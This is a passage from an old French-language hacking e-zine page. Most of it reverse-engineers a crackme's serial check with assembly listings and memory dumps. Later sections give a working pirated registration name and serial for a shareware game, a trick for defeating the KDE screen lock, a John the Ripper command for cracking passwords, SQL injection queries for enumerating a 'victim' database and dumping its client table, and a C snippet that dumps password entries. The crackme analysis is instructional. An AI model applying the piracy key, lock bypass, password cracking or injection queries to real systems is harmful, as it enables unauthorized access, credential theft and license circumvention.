        '1') puis on fait un loop. On en d&eacute;duit que ecx est d&eacute;cr&eacute;ment&eacute;.<br>
        Or ecx est la valeur 8 - longueur(login). C'est &agrave; dire que l'op&eacute;ration 
        va se r&eacute;peter jusqu'&agrave; ce que notre login ai atteint 8 caract&egrave;res 
        et ce en ajoutant &agrave; chaque fois '0', '1', '2'... Avec Sirius on 
        obtient Sirius01. Avec SB on aurrait eu SB012345.</p>
      <p>Bon c'est fini pour le <b>PRE-CALL</b>. Si on regarde l'algo que je vous 
        ai mis au d&eacute;but, maintenant on passe par l'API GetDlgItemInt qui 
        comme son nom l'indique lit un entier. Apr&egrave;s quelques essai on 
        se rend compte que cette fonction ne renvoie une valeur qui si on lui 
        donne un chiffre. Comme d'habitude la valeur de retour est dans eax. Les 
        infos des API nous donnent :</p>
      <p class="script">API UINT Arg00 = GetDlgItemInt(Arg01,Arg02,Arg03,Arg04)<br>
        API Address=00401426, API Return Address=00401305<br>
        Arg01 = (HWND) 00000d30 (Window&quot;Register&quot;)<br>
        Arg02 = (int) 00000066<br>
        Arg03 = (BOOL *) 00000000<br>
        Arg04 = (BOOL) 00000000</p>
      <p class="script">RESULT for API GetDlgItemInt<br>
        Arg00 = (UINT) 00000<font color="#FF0000">29a</font><br>
        Arg01 = (HWND) 00000d30 (Window&quot;Register&quot;)<br>
        Arg02 = (int) 00000066<br>
        Arg03 = (BOOL *) 00000000<br>
        Arg04 = (BOOL) 00000000</p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p></p>
      <p>O&ugrave; 29a est bien &eacute;videmment la traduction hexa de notre 
        666. On fait un petit tour dans la m&eacute;moire pour voir o&ugrave; 
        en sont les donn&eacute;es :</p>
      <p><span class="script">:00402178 79 20 65 2D 6D 61 69 6C y e-mail<br>
        :00402180 20 74 6F 20 3A 20 50 68 to : Ph<br>
        :00402188 72 6F 7A 65 6E 5F 71 40 rozen_q@<br>
        :00402190 63 79 62 65 72 64 75 64 cyberdud<br>
        :00402198 65 2E 63 6F 6D 20 00 43 e.com .C<br>
        :004021A0 6F 72 72 65 63 74 20 21 orrect !<br>
        :004021A8 00 53 69 72 69 75 73 30 .<font color="#FF0000">Sirius0</font><br>
        :004021B0 31 00 00 00 00 00 00 00 <font color="#FF0000">1</font>.......<br>
        :004021B8 00 00 00 00 00 00 00 00 ........<br>
        :004021C0 00 00 00 00 00 00 00 00 ........<br>
        :004021C8 00 00 00 00 00 00 00 00 ........<br>
        :004021D0 00 06 <font color="#FF0000">9A 02 00 00</font> 50 68 ......Ph<br>
        :004021D8 72 6F 5A 65 6E 51 00 00 roZenQ..<br>
        :004021E0 00 00 00 00 00 00 00 00 ........<br>
        :004021E8 00 00 00 00 00 00 00 00 ........<br>
        :004021F0 00 00 00 00 00 00 00 00 ........<br>
        :004021F8 00 00 00 00 00 00 00 00 ........</span><br>
        <br>
        Vous pouvez remarquer que notre chiffre est mis &agrave; l'envers dans 
        la m&eacute;moire, c'est comme &ccedil;a pour tous les chiffres. Donc 
        si ce que l'on a entr&eacute; lui convient il vas vers les deux call juste 
        avant le test final sinon il se barre. Encore une fois on voit que ce 
        serait tr&egrave;s facile de patcher le test final mais c'est moins int&eacute;ressant 
        ;-). J'ai appel&eacute; les deux calls respectivement <b>call1</b> et 
        <b>call2</b>.</p>
      <p>Etudions le premier call :</p>
      <p class="script">* Referenced by a CALL at Address:<br>
        |:00401312 <br>
        | <font color="#FF0000">// on initialise</font><br>
        :00401375 33C9 xor ecx, ecx <font color="#FF0000">// on met ecx &agrave; 
        0</font><br>
        :00401377 BEA9214000 mov esi, 004021A9 <font color="#FF0000">// esi pointe 
        vers notre chaine (Sirius01)</font> <br>
        :0040137C 8BFE mov edi, esi <font color="#FF0000">// edi aussi</font></p>
      <p class="script">* Referenced by a (U)nconditional or (C)onditional Jump 
        at Address:<br>
        |:00401391(C)<br>
        |<br>
        :0040137E AC <font color="#0000FF">lodsb</font><br>
        :0040137F F7D1 <font color="#0000FF">not ecx</font><br>
        :00401381 8A99B1214000 <font color="#0000FF">mov bl, byte ptr [ecx+004021B1]</font><br>
        :00401387 F7D1 <font color="#0000FF">not ecx</font><br>
        :00401389 02C3 <font color="#0000FF">add al, bl</font><br>
        :0040138B AA <font color="#0000FF">stosb</font><br>
        :0040138C FEC1 <font color="#0000FF">inc cl</font><br>
        :0040138E 80F904 <font color="#0000FF">cmp cl, 04</font><br>
        :00401391 75EB <font color="#0000FF">jne 0040137E</font><br>
        :00401393 B904000000 mov ecx, 00000004<br>
        :00401398 BEA9214000 mov esi, 004021A9<br>
        :0040139D 8BFE mov edi, esi<br>
        :0040139F 83C704 add edi, 00000004<br>
        :004013A2 F2 repnz<br>
        :004013A3 A4 movsb<br>
        :004013A4 BEA9214000 mov esi, 004021A9<br>
        :004013A9 8BFE mov edi, esi<br>
        :004013AB B908000000 mov ecx, 00000008<br>
        :004013B0 AC <font color="#0000FF">lodsb</font><br>
        :004013B1 F7D1 <font color="#0000FF">not ecx</font><br>
        :004013B3 8A99DF214000 <font color="#0000FF">mov bl, byte ptr [ecx+004021DF]</font><br>
        :004013B9 F7D1 <font color="#0000FF">not ecx</font><br>
        :004013BB 32C3 <font color="#0000FF">xor al, bl</font><br>
        :004013BD AA <font color="#0000FF">stosb</font><br>
        :004013BE E2F0 <font color="#0000FF">loop 004013B0</font><br>
        :004013C0 C3 ret</p>
      <p>Ce que j'ai mis en bleu, ce sont les deux boucles principales de notre 
        call1. Voyons la premi&egrave;re boucle :<br>
        lodsb est &agrave; peut pr&egrave;s ce que fait stosb mais en sens inverse. 
        Cette instruction remplie al avec l'octet point&eacute; par esi.<br>
        not ecx permet de compl&eacute;menter ecx. On peut consid&eacute;rer cela 
        comme un calcul de l'inverse. A quoi &ccedil;a va servir ? et bien en 
        fait pour faire des soustractions. En fait soustraire 3, c'est comme ajouter 
        -3. De m&ecirc;me soustraire 00000001 serait comme ajouter fffffffe. Donc 
        que fait notre boucle ? D&egrave;s le d&eacute;but, elle met dans al le 
        premier caract&egrave;re de notre chaine et esi est incr&eacute;ment&eacute; 
        (comme stosb faisait avec edi).<br>
        Puis ecx est compl&eacute;ment&eacute;. ecx a &eacute;t&eacute; pr&eacute;cedemment 
        fix&eacute; &agrave; z&eacute;ro donc l&agrave; il prend la valeur ffffffff.<br>
        004021B1 est le pointeur vers le dernier caract&egrave;re de notre chaine 
        ('1').<br>
        L'instruction mov bl, byte ptr [ecx+004021B1] signifie que bl prend la 
        valeur sur un octet de la valeur point&eacute; par (dernier caract&egrave;re 
        - 0). Donc bl prend le caract&egrave;re '1'. Le premier caract&egrave;re 
        (al) et le dernier (bl) sont ensuite additionn&eacute;<br>
        Juste apr&egrave;s ecx est compl&eacute;ment&eacute; de nouveau pour reprendre 
        sa valeur d'avant.<br>
        Avec stosb, notre premier caract&egrave;re est remplac&eacute; par le 
        premier + le dernier = la valeur hexa de 'S' + '1'.<br>
        cl est ensuite incr&eacute;ment&eacute;. On recommence cette boucle tant 
        qu'il n'est pas &eacute;gal &agrave; 4 (la moiti&eacute; de notre chaine).</p>
      <p>ecx vaut donc maintenant 1. On en d&eacute;duit que al vas prendre la 
        valeur login[1] en consid&eacute;rant que login[0] correspond au premier 
        caract&egrave;re et login[n] au dernier. En fait notre boucle calcule 
        &agrave; chaque fois login[ecx] + login[n-ecx] jusqu'&agrave; ce que ecx 
        vaut 4. On va donc calculer la somme du premier et du 8i&egrave;me, du 
        second et du septi&egrave;me, du troisi&egrave;me et du sixi&egrave;me 
        puis de quatri&egrave;me avec le 5i&egrave;me. A chaque fois, par l'interm&eacute;diaire 
        de stosb, la somme est mise &agrave; la place de notre chaine d'origine. 
        En C, cela nous donne :</p>
      <pre><span class="script">for (i=0;i!=4;i++){
 </span><span class="script">login[i]=login[i]+login[8-i];
}</span></pre>
      <p>Et on obtient :</p>
      <p><span class="script">:004021A0 6F 72 72 65 63 74 20 21 orrect !<br>
        :004021A8 00 <font color="#FF0000">84 99 E5 DE</font> 75 73 30 .<font color="#FF0000">....</font>us0<br>
        :004021B0 31 00 00 00 00 00 00 00 1.......<br>
        :004021B8 00 00 00 00 00 00 00 00 ........<br>
        :004021C0 00 00 00 00 00 00 00 00 ........<br>
        :004021C8 00 00 00 00 00 00 00 00 ........<br>
        :004021D0 00 06 <font color="#FF0000">9A 02 00 00</font> 50 68 ......Ph</span><br>
        <br>
        Donc voil&agrave; notre code &agrave; la fin de la premi&egrave;re boucle 
        : DEE59984 (je vous rappelle que les chiffres sont stock&eacute;s &agrave; 
        l'envers).<br>
        Les quelques isnstructions entre les deux boucles provoquent les calculs 
        suivants :<br>
        esi pointe sur les 4 premiers octets du login (DEE59984) et edi sur les 
        4 derniers ('us01'). Puis le premier octet de edi prend la valeur du premier 
        octet de esi, ensuite on recommence jusqy'&agrave; ce que ecx soit nul 
        (instructions repnz et movsb). Et comme ecx &eacute;tait initialis&eacute; 
        &agrave; 4 on obtient :</p>
      <p><span class="script">:004021A0 6F 72 72 65 63 74 20 21 orrect !<br>
        :004021A8 00 <font color="#0000FF">84</font> <font color="#0000FF">99 
        E5 DE</font> <font color="#FF0000">84</font> <font color="#FF0000">99 
        E5</font> .<font color="#0000FF">....<font color="#FF0000">.</font></font><font color="#FF0000">..</font><br>
        :004021B0 <font color="#FF0000">DE</font> 00 00 00 00 00 00 00 <font color="#FF0000">.</font>.......<br>
        :004021B8 00 00 00 00 00 00 00 00 ........<br>
        :004021C0 00 00 00 00 00 00 00 00 ........<br>
        :004021C8 00 00 00 00 00 00 00 00 ........<br>
        :004021D0 00 06 <font color="#FF0000">9A 02 00 00</font> 50 68 ......Ph</span><br>
        <br>
        La seconde boucle consiste &agrave; faire un xor de tout &ccedil;a avec 
        la chaine 'PhroZenQ'. Le r&eacute;sultat restant toujours &agrave; la 
        m&ecirc;me place. On a :</p>
      <p><span class="script">:004021A0 6F 72 72 65 63 74 20 21 orrect !<br>
        :004021A8 00 <font color="#FF0000">D4 F1 97 B1 DE FC 8B</font> .<font color="#FF0000">.......</font><br>
        :004021B0 <font color="#FF0000">8F</font> 00 00 00 00 00 00 00 <font color="#FF0000">.</font>.......<br>
        :004021B8 00 00 00 00 00 00 00 00 ........<br>
        :004021C0 00 00 00 00 00 00 00 00 ........<br>
        :004021C8 00 00 00 00 00 00 00 00 ........<br>
        :004021D0 00 06 <font color="#FF0000">9A 02 00 00</font> 50 68 ......Ph</span><br>
        <br>
        Bon jusque l&agrave;, &ccedil;a allait... Mais l&agrave; on tombe sur 
        un truc de parano&iuml;aque obsessionnel gravement atteint au LSD. J'ai 
        pass&eacute; des mois sur cette putain de routine sans r&eacute;ussir 
        &agrave; voir comment l'inverser. Finalement je me suis d&eacute;cid&eacute; 
        pour regarder l'explication avec le crakme mais g pas vraiment compris 
        comment &ccedil;a marche. Apparemment c'est tellement bien foutu que l'on 
        peut pas faire un simple script qui transforme notre login en serial, 
        il faut utiliser une m&eacute;thode brute force pour une partie de la 
        routine... Enfin bon voici donc le <b>call2 </b>:</p>
      <p class="script">* Referenced by a CALL at Address:<br>
        |:00401317 <br>
        |<br>
        :004013C1 A1D2214000 mov eax, dword ptr [004021D2] <font color="#FF0000">; 
        le code que l'on a entre (666)</font><br>
        :004013C6 8A0DA9214000 mov cl, byte ptr [004021A9] <font color="#FF0000">; 
        premier octet du code genere (D4)</font><br>
        :004013CC D3C0 rol eax, cl <font color="#FF0000">; :-( ca commence mal</font><br>
        :004013CE 8B0DAE214000 mov ecx, dword ptr [004021AE] <font color="#FF0000">;3 
        derniers octets du code (00 8F 8B FC)</font><br>
        :004013D4 33C1 xor eax, ecx<br>
        :004013D6 8B1DAA214000 mov ebx, dword ptr [004021AA] <font color="#FF0000">; 
        milieu du code (DE B1 97 F1)</font><br>
        :004013DC 8AC8 mov cl, al<br>
        :004013DE D3CB ror ebx, cl<br>
        :004013E0 33C3 xor eax, ebx <font color="#FF0000">; ZE Big Test, le xor 
        renvoie 0 en cas de succ&egrave;s </font><br>
        :004013E2 B800000000 mov eax, 00000000 <font color="#FF0000">; eax est 
        mis &agrave; 0</font><br>
        :004013E7 7506 jne 004013EF <font color="#FF0000">; si les valeurs ne 
        sont pas les memes on quitte avec eax=0</font><br>
        :004013E9 90 nop<br>
        :004013EA 90 nop<br>
        :004013EB 90 nop<br>
        :004013EC 90 nop<br>
        :004013ED FEC0 inc al <font color="#FF0000">; sinon c la f&ecirc;te, on 
        quitte avec eax = 1 --&gt; &quot;COOL !!...&quot;</font></p>
      <p class="script">* Referenced by a (U)nconditional or (C)onditional Jump 
        at Address:<br>
        |:004013E7(C)<br>
        |<br>
        :004013EF C3 ret</p>
      <p>Explication : On commence par r&eacute;cup&eacute;rer le code que l'on 
        a entr&eacute; dans eax.<br>
        Ensuite on &quot;rol&quot; ce code avec le premier octet du code g&eacute;n&eacute;r&eacute;. 
        Le rol c'est un roulement &agrave; gauche (left). C'est &agrave; dire 
        que l'on va d&eacute;caler les bits vers la gauche en ce en bouclant (les 
        bits qui sorte &agrave; gauche se retrouvent &agrave; droite). Voici un 
        ptit exemple :</p>
      <p class="script">mov AH, C0 <font color="#FF0000">; AH = 1100 0000</font><br>
        rol AH, 1 <font color="#FF0000">; on d&eacute;cale les bits de AH d'un 
        cran sur la gauche --&gt; AH = 1000 0001</font><br>
        mov CL, 2<br>
        rol AH, CL <font color="#FF0000">; on d&eacute;cale les bits de CL cran 
        sur la gauche --&gt; AH devient 0000 0110</font></p>
      <p>Une fois que le roulement est fait, le r&eacute;sultat est &quot;xor&eacute;&quot; 
        avec les 3 derniers octets de notre code. En fait il en prend quatre vu 
        qu'il demande un dword mais le quatri&egrave;me est &agrave; 00. Jusque 
        l&agrave; rien de sp&eacute;cial : on fait des calculs sur le pass que 
        l'on a entr&eacute;, notre code g&eacute;n&eacute;r&eacute; est lui intact.<br>
        Et l&agrave;... C'est le drame ;-)<br>
        Une partie de notre code g&eacute;n&eacute;r&eacute; (octets 2 &agrave; 
        5) est mise dans ebx puis &quot;ror&eacute;&quot; avec le pass modifi&eacute;. 
        Ces deux putains de code se crypent l'un avec l'autre (et vise et versa 
        :-).<br>
        Et puis histoire de nous embrouiller encore un peu plus, on fait en xor 
        mais dans le sens inverse : notre code g&eacute;n&eacute;r&eacute; sur 
        notre code entr&eacute;. Et alors si par une quelconque magie ce sont 
        les m&ecirc;mes alors on ne fait pas le jump, eax est mis &agrave; 1. 
        On retourne dans notre routine de d&eacute;but, on teste eax est si il 
        vaut 1 alors c gagne.<br>
        C'est plut&ocirc;t difficile &agrave; expliquer mais essayez de touver 
        comme &ccedil;a marche et vous verrez que c'est super chaud.<br>
        La bonne chose c'est que les concepteurs de logiciels ne mettent pas des 
        tests aussi compliqu&eacute; que celui l&agrave; donc le keygening a encore 
        de beaux jours devant lui. Et le patching encore plus car ce prog est 
        l'exemple m&ecirc;me de comment passer une putain de protection &agrave; 
        la con en modifiant deux ou trois octets.</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u>Je peux dire une connerie 
      ? </u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText"> 
      <p>Encore un petit entracte. D'abord le <b>verou de KDE</b> qui est une 
        vrai daube : quand vous utilisez la fonction &quot;verrouiller ecran&quot; 
        de KDE, il suffit d'un Control+Alt+BackSpace pour killer KDE et donc le 
        verou et se retrouver sur votre shell de d&eacute;part (juste avant que 
        vous ayez fait un startx) et bien evidemment &ccedil;a ne d&eacute;loge 
        pas. Donc une personne qui a acc&egrave;s &agrave; votre pc pendant votre 
        absence peut malgr&egrave;s cette protection (minable) faire tout ce qu'il 
        veut sur votre compte.</p>
      <p>Deuxi&egrave;me partie de cette entracte :<br>
        Pour m'exercer au cracking j'avais achet&eacute; un mag (PC Shareware) 
        sur lequel ya un tas de petits logiciels. J'ai crack&eacute; un jeu qui 
        s'appelle<b> Melker - The Elk Hunt</b>. C'est un jeu pour les gosses dans 
        lequel vous contr&ocirc;lez un &eacute;lan qui a trop hibern&eacute; et 
        qui se retrouve tout seul alors que les autres sont de l'autre c&ocirc;t&eacute; 
        de la for&ecirc;t. Vous devez donc les rejoindre mais le probl&ecirc;me 
        c'est que la chasse &agrave; l'&eacute;lan a commenc&eacute;. Je l'ai 
        crack&eacute; de la m&ecirc;me fa&ccedil;on que WinZip et j'&eacute;tais 
        tellement surpris que &ccedil;a marche du premier coup que j'ai pas pu 
        not&eacute; le s&eacute;rial que j'avais trouv&eacute;. Mais apparemment 
        il garde l'info dans Melker.ini qui se trouve dans votre rep windows (c:\windows\ 
        chez moi).<br>
        Donc si vous avez ce jeu chez vous en version shareware faites plaisir 
        &agrave; votre petit fr&egrave;re (ou &agrave; votre fils) et ajoutez 
        au fichier Melker.ini les lignes suivantes :</p>
      <p>[REGISTER]<br>
        NAME=niico<br>
        NUMBER=091224464</p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="john16"></a>Utilisation 
      de John The Ripper v1.6 </u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText">Juste pour vous dire que John 
      version 1.6 poss&egrave;de une <b>fonction ultra puissante </b>: appliquer 
      des r&egrave;gles de calcul aux mots issus de dictionnaires. C'est &agrave; 
      dire ajouter des chiffres &agrave; la fin... Comme la fonction single de 
      John v1.0 mais avec les mots du dico que vous lui passez. Je poss&egrave;de 
      plusieurs dico dont deux que jai fait et dont je suis tr&egrave;s fier car 
      ils me permettent de cracker facilement un bon nombre de passwords.<br>
      Ligne de commande : john -w.dico.txt -rules passwd<br>
      Je vous donne les deux fichiers avec le mag l'un s'appelle name.txt et contient 
      des pr&eacute;noms fran&ccedil;ais et leurs raccourcis : t&egrave;s puissant.<br>
      Le second, dico.txt est moins puissant et plus adapt&eacute; aux passwords 
      de jeunz.</td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="sqlinjection"></a>SQL 
      injection avec une base MySQL</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText"> 
      <p>Tout le monde (ou presque) conna&icirc;t la m&eacute;thode SQL injection. 
        Je ne l'expliquerai donc pas en d&eacute;tail alors qu'une recherche sur 
        google doit cracher une tonne de doc. Le probl&egrave;me avec la SQL injection 
        c'est que pour avoir un acc&egrave;s &agrave; toute la base il faut conna&icirc;tre 
        son nom, ses tables, ses champs sans quoi vous &ecirc;tes condamne&eacute;s 
        &agrave; faire des 'or 1=1' ;-)<br>
        Alors voil&agrave; quelques requ&ecirc;tes &agrave; faire ex&eacute;cuter 
        pour conna&icirc;tre votre victime par coeur :<br>
        Commencez par un <font color="#FF0000">show databases;</font> vous obtenez 
        alors le nom des bases de donn&eacute;es par exemple les bases web, ventes 
        et production pour une entreprise. Nous on voudrait les logins/passwords 
        des gens qui se connectent sur le site. En supposant que c'est dans la 
        base de donn&eacute;e web, on fait <font color="#FF0000">show tables from 
        web;</font> on obtient alors par exemple les tables client, commande, 
        produit, etc. Pour voir les champs de la table client il nous reste plus 
        qu'&agrave; faire <font color="#FF0000">select * from web.client;</font></p>
    </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u>Petit oubli</u></b></td>
  </tr>
  <tr>
    <td valign="top" height="-2" class="normalText">
      <p>J'aurais du mettre &ccedil;a avec le premier article des pass Unix mais 
        bon... C'est un prog ultra connu, la premi&egrave;re fois mis dans le 
        hack-faq du 2600 (enfin il me semble que ce sont eux les premiers). Il 
        sert &agrave; r&eacute;cup&eacute;rer les passwords crypt&eacute;s sur 
        pas mal de syst&egrave;mes :</p>
      <p class="script">#include pwd.h<br>
        main()<br>
        {<br>
        &nbsp;&nbsp;struct passwd *p;<br>
        &nbsp;&nbsp;while(p=getpwent())<br>
        &nbsp;&nbsp;printf(&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;, p-pw_name,<br>
        &nbsp;&nbsp;&nbsp;p-pw_passwd,p-pw_uid, p-pw_gid, p-pw_gecos,<br>
        &nbsp;&nbsp;&nbsp;p-pw_dir, p-pw_shell);<br>
        }</p>
      </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="subheading"><b><u><a name="conclusion"></a>Conclusion</u></b></td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText"> 
      <p>En conclusion je pense que j'ai r&eacute;ussi le pari de faire un num&eacute;ro 
        encore mieu que les pr&eacute;c&eacute;dents. Est-ce qu'il y aura un num&eacute;ro 
        5 ? Aucune id&eacute;e, &ccedil;a d&eacute;pend de vous. J'attends vos 
        articles &agrave; <a href="mailto:sirius.black@lycos.fr">sirius.black@lycos.fr</a>, 
        tous les sujets en rapport avec l'informatique/hacking/phreaking/cracking/crading 
        sont accept&eacute;s.<br>
        <br>
        Je suis aussi sur un autre <font color="#FF0000"><b>projet de mag qui 
        aura pour sujet... tout ce que vous voulez !</b></font> Vous voulez crier 
        votre haine ? Dire ce que vous pensez des mecs qui nous gouvernent ? Ecrire 
        un texte sous l'emprise du cannabis ? Faire une histoire de science fiction 
        ? Parler zic, un groupe qui vous plait, un style musical ou une passion 
        que vous voulez partager parce que trop m&eacute;connu ? <font color="#FF0000"><b>Ecrire 
        un article de pur d&eacute;lire ?</b></font> N'h&eacute;sitez pas &agrave; 
        m'envoyer des codes sources humouristiques (du style devenir_president.c). 
        Ce <font color="#FF0000"><b>projet est ouvert &agrave; TOUS</b></font>. 
        Si vous avez toujours voulu &eacute;crire un article pour un mag sans 
        savoir comment le distribuer,<b> <font color="#FF0000">si vous avez des 
        textes d&eacute;jant&eacute;s qui tra&icirc;nent sur votre disque dur</font></b>, 
        envoyez moi tout &ccedil;a en mettant bien votre pseudo &agrave; <b><font color="#FF0000"><a href="mailto:sirius.black@lycos.fr">sirius.black@lycos.fr</a>.<br>
        </font></b><font color="#000000">J'accepte aussi les hoax les plus d&eacute;biles 
        que vous avez trouv&eacute; et/ou que vous avez cr&eacute;&eacute;. Pas 
        un classique avec un enfant estropi&eacute; en Ethiopie !! En vrai compl&eacute;tement 
        d&eacute;bile.<br>
        <br>
        Sinon quoi de neuf ? Bah g fini www.Try2Hack.nl et j'ai commenc&eacute; 
        www.slyfx.com, je suis actuellement au level6. Si vous n'avez pas lu mes 
        mags pr&eacute;c&eacute;dents, allez sur <a href="http://membres.lycos.fr/lotfree">membres.lycos.fr/lotfree</a></font></p>
      </td>
  </tr>
  <tr> 
    <td valign="top" height="-2" class="normalText"> 
      <div align="center"><img src="chesireCat.gif" width="315" height="450"></div>
    </td>
  </tr>
</table>
</body>
</html>
